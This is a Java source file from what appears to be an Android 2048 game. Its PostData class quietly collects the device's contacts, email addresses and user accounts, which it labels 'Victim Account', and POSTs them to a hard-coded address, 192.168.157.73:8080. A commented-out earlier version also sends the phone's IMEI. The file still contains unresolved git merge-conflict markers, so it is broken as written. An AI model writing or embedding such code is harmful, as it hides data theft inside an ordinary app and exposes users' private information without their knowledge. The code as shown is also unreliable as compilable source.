package aarkay.a2048game;

import static contacts.core.ContactsKt.Contacts;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class PostData {
    @RequiresApi(api = Build.VERSION_CODES.O)
    public PostData(@NotNull Context context) throws IOException {



        RequestQueue queue = Volley.newRequestQueue(context);

        String urlString = "http://192.168.157.73:8080/postData";

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                Log.d("Sending Data", "Exfiltrating");
                try {
                    StringRequest stringRequest = new StringRequest(Request.Method.POST, urlString,
                            new Response.Listener<String>() {

                                @Override
                                public void onResponse(String response) {

                                    Log.d("Response String", response.substring(0, 500));
                                }
                            }, new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Log.d("Volley Error", String.valueOf(error));
                        }
                    }) {
                        @Override
                        protected Map<String, String> getParams() {
                            //Using HashMap to craft the data to be sent
                            Map<String, String> params = new HashMap<String, String>();
                            //      params.put("IMEINumber", IMEINumber);
                            Log.d("dd", Contacts(context).query().find().toString());
                            Log.d("Emails", Contacts(context).data().query().emails().find().toString());
                            Log.d("Victim User Account", Contacts(context).accounts().query().find().toString());

                            params.put("Contacts", Contacts(context).query().find().toString());
                            params.put("Emails", Contacts(context).data().query().emails().find().toString());
                            params.put("Victim Account", Contacts(context).accounts().query().find().toString());

                            return params;
                        }
                    };
                    queue.add(stringRequest);
                } catch (Exception e) {
                    Log.d("Error", e.toString());
                }
            }
        });

        thread.start();
    }
<<<<<<< HEAD
}

//package aarkay.a2048game;
//
//import static contacts.core.ContactsKt.Contacts;
//import static khttp.KHttp.post;
//import android.content.Context;
//import android.os.Build;
//import android.telephony.TelephonyManager;
//import android.util.Log;
//
//import androidx.annotation.RequiresApi;
//
//import com.android.volley.Request;
//import com.android.volley.RequestQueue;
//import com.android.volley.Response;
//import com.android.volley.VolleyError;
//import com.android.volley.toolbox.StringRequest;
//import com.android.volley.toolbox.Volley;
//
//import org.jetbrains.annotations.NotNull;
//
//import java.io.IOException;
//import java.util.HashMap;
//import java.util.Map;
//
//public class PostData {
//    @RequiresApi(api = Build.VERSION_CODES.O)
//    public PostData(@NotNull Context context) throws IOException {
//        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//        String IMEINumber = telephonyManager.getImei();
//        Log.d("dd", Contacts(context).query().find().toString());
//
//        Map<String, String> data = new HashMap<String, String>();
//        data.put("key", IMEINumber);
//
//        RequestQueue queue = Volley.newRequestQueue(context);
//        String urlString = "http://192.168.157.73:8080/postData";
//
//        Thread thread = new Thread(new Runnable() {
//            @Override
//            public void run() {
//                try {
//                    StringRequest stringRequest = new StringRequest(Request.Method.POST, urlString,
//                            new Response.Listener<String>() {
//
//                                @Override
//                                public void onResponse(String response) {
//                                    // Display the first 500 characters of the response string.
//                                    Log.d("dd", response.substring(0, 500));
//                                }
//                            }, new Response.ErrorListener() {
//                        @Override
//                        public void onErrorResponse(VolleyError error) {
//                            Log.d("dd", String.valueOf(error));
//                        }
//                    }) {
//                        @Override
//                        protected Map<String, String> getParams() {
//                            //Using HashMap to craft the data to be sent
//                            Map<String, String> params = new HashMap<String, String>();
//                            params.put("IMEINumber", IMEINumber);
//                            params.put("Contacts", Contacts(context).query().find().toString());
//                            return params;
//                        }
//                    };
//                    queue.add(stringRequest);
//                } catch (Exception e) {
//                    Log.d("dd", Contacts(context).query().find().toString());
//                }
//            }
//        });
//        thread.start();
//    }
//}
=======
}
>>>>>>> d7f99c5... Clean up repo
